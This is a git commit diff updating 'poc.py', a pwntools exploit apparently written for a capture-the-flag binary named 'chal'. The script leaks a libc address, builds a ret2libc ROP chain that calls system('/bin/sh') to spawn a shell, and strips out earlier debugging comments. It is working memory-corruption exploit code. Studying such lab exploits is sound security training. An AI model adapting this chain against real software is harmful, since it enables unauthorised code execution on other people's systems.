445488bf61e79e0d2d9a632398d4eeba82e41122
8490 <141814977+8-4-9-0@users.noreply.github.com>
2025-07-31 21:45:42 +0900

    Update poc.py

--- poc.py
+++ poc.py
@@ -1,6 +1,5 @@
 from pwn import *
 
-
 target = './chal'
 context.os = 'linux'
 context.arch = 'amd64'
@@ -10,8 +9,8 @@ binary = ELF(target)
 libc = binary.libc
 addr = libc.symbols['system']
 arg = next(libc.search('/bin/sh\x00'))
-print(libc, hex(addr), hex(arg))
-gadget = 0x0002a3e5 # pop rdi; ret
+gadget_1 = 0x0002a3e5 # pop rdi
+gadget_2 = 0x40101a # ret
 offset = 72
 
 proc = process(target)
@@ -21,31 +20,12 @@ b = proc.recv()[2:14].decode()
 libc_base = int(b, 16) - 128 - (libc.symbols['__libc_start_main'] - 0xb0)
 
 payload = b'A' * offset
-payload += pack(0x40101a)
-payload += pack(libc_base+gadget)
+payload += pack(gadget_2)
+payload += pack(libc_base+gadget_1)
 payload += pack(libc_base+arg)
-#payload += pack(0x40101a)
 payload += pack(libc_base+addr)
 payload += b'AAAAAAAA'
 payload += pack(libc_base+arg)
-
-# 0x000055555555521c
-# 0x0000555555555257
-"""
-proc = gdb.debug(target, '''
-    b *0x4011da
-    b *0x401201
-    continue
-''')
-"""
-
-"""
-gdb.attach(proc, '''
-    b *0x4011da
-    b *0x401201
-    continue
-''')
-"""
 
 proc.sendline(payload)
 proc.interactive()
